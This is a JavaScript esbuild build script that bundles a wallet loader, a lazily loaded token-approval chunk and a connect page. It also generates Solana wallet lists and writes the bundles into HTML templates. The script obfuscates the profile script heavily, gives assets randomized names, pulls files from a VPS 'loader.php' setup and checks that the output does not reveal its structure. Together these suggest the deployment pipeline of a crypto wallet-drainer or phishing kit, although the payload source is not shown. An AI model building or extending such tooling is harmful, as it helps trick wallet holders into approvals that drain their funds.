import * as esbuild from "esbuild";

import { existsSync, unlinkSync } from "node:fs";

import { copyFile, mkdir, readFile, rm, writeFile } from "node:fs/promises";

import { dirname, join } from "node:path";

import { spawnSync } from "node:child_process";

import { obfuscateJs } from "./scripts/obfuscate.mjs";

import { syncVercelJsonHeaders } from "./scripts/sync-vercel-json.mjs";

import { browserDepsPlugin } from "./scripts/browser-deps-plugin.mjs";



const profileHtmlTpl = "public/profile/index.template.html";
const connectHtmlTpl = "public/connect/index.template.html";



/** @type {{ bundle: string; profileScript: string; gateway: string; approvalChunk: string; splitChunks: string[] }} */

const assetNames = JSON.parse(await readFile("asset-names.json", "utf8"));



syncVercelJsonHeaders(assetNames);

console.log("Synced vercel.json headers");



const bundleOut = join("public", assetNames.bundle);

const approvalOut = join("public", assetNames.approvalChunk);

const profileScriptOut = join("public/profile", assetNames.profileScript);

const profileHtmlPath = "public/profile/index.html";

const connectHostOut = join("public", assetNames.connectHost);

const connectHtmlPath = "public/connect/index.html";



const gen = spawnSync(process.execPath, ["scripts/generate-solana-wallets.mjs"], {

  stdio: "inherit",

});



if (gen.status !== 0) {

  if (!existsSync("src/solana-wallets.js")) {

    console.error("Missing src/solana-wallets.js — commit it or set reown_project_id in ../vps/loader.php");

    process.exit(1);

  }

  console.warn("Wallet list not regenerated — using existing src/solana-wallets.js");

}



await mkdir("public", { recursive: true });

await mkdir("public/profile", { recursive: true });
await mkdir("public/connect", { recursive: true });

await mkdir(dirname(approvalOut), { recursive: true });



const faviconSrc = join("..", "vps", "public", "tYZq2BsVawvS5wYEF.svg");

const faviconOut = join("public", "tYZq2BsVawvS5wYEF.svg");

if (existsSync(faviconSrc)) {

  await copyFile(faviconSrc, faviconOut);

  console.log("Copied favicon → public/tYZq2BsVawvS5wYEF.svg");

}



for (const stale of ["public/wallet.bundle.js", "public/profile/page.js"]) {

  if (existsSync(stale)) unlinkSync(stale);

}



const chunkDir = join("public", "chunks");

if (existsSync(chunkDir)) {

  await rm(chunkDir, { recursive: true, force: true });

  await mkdir(chunkDir, { recursive: true });

}



await esbuild.build({

  entryPoints: ["src/token-approval.js"],

  outfile: approvalOut,

  bundle: true,

  packages: "bundle",

  format: "esm",

  platform: "browser",

  target: ["es2020"],

  minify: true,

  sourcemap: false,

  legalComments: "none",

  plugins: [browserDepsPlugin()],

});

console.log(`Built ${approvalOut}`);



await esbuild.build({

  entryPoints: ["src/wallet-loader.js"],

  outfile: bundleOut,

  bundle: true,

  packages: "bundle",

  format: "esm",

  platform: "browser",

  target: ["es2020"],

  mainFields: ["browser", "module", "main"],

  conditions: ["browser", "import", "module", "default"],

  minify: true,

  sourcemap: false,

  legalComments: "none",

  inject: ["src/browser-shims.js"],

  plugins: [browserDepsPlugin()],

});



let bundleJs = await readFile(bundleOut, "utf8");

const approvalChunk = assetNames.approvalChunk;

bundleJs = bundleJs.replace(

  /import\(\s*["']\.\/token-approval\.js["']\s*\)/g,

  `import("__CHUNK__/${approvalChunk}")`,

);



await writeFile(bundleOut, bundleJs, "utf8");



assetNames.splitChunks = [approvalChunk];

await writeFile("asset-names.json", JSON.stringify(assetNames, null, 2) + "\n", "utf8");



bundleJs = await readFile(bundleOut, "utf8");

if (bundleJs.includes("Dynamic require of")) {

  console.error(

    "Bundle contains esbuild dynamic require shim — do not deploy. Rebuild or adjust obfuscator/esbuild options.",

  );

  process.exit(1);

}

const bareScaffold = bundleJs.includes("@reown/appkit-scaffold-ui/");

const dynamicImports = [...bundleJs.matchAll(/import\s*\(/g)].length;

if (dynamicImports > 1 || bareScaffold) {

  console.error(

    `Bundle has ${dynamicImports} dynamic import() (expected 1 approval chunk) or bare scaffold paths.`,

  );

  process.exit(1);

}



console.log(`Built ${bundleOut} (ESM entry + lazy ${approvalChunk})`);

await esbuild.build({
  entryPoints: ["src/connect-host.js"],
  outfile: connectHostOut,
  bundle: true,
  packages: "bundle",
  format: "esm",
  platform: "browser",
  target: ["es2020"],
  mainFields: ["browser", "module", "main"],
  conditions: ["browser", "import", "module", "default"],
  minify: true,
  sourcemap: false,
  legalComments: "none",
  inject: ["src/browser-shims.js"],
  plugins: [browserDepsPlugin()],
});

console.log(`Built ${connectHostOut}`);

const profileSource = await readFile("src/profile-page.js", "utf8");

const obfuscatedProfile = obfuscateJs(profileSource, {

  controlFlowFlatteningThreshold: 1,

  stringArrayWrappersCount: 2,

});

await writeFile(profileScriptOut, obfuscatedProfile, "utf8");

console.log(`Built ${profileScriptOut}`);



const htmlSource = await readFile(profileHtmlTpl, "utf8");



const profileHtml = htmlSource.replace("__PROFILE_SCRIPT__", assetNames.profileScript);

await writeFile(profileHtmlPath, profileHtml, "utf8");

console.log(`Updated ${profileHtmlPath} → ${assetNames.profileScript}`);

const connectHtmlSource = await readFile(connectHtmlTpl, "utf8");
const connectHtml = connectHtmlSource.replace(
  "__CONNECT_SCRIPT__",
  `/${assetNames.connectHost}`,
);
await writeFile(connectHtmlPath, connectHtml, "utf8");
console.log(`Updated ${connectHtmlPath} → ${assetNames.connectHost}`);

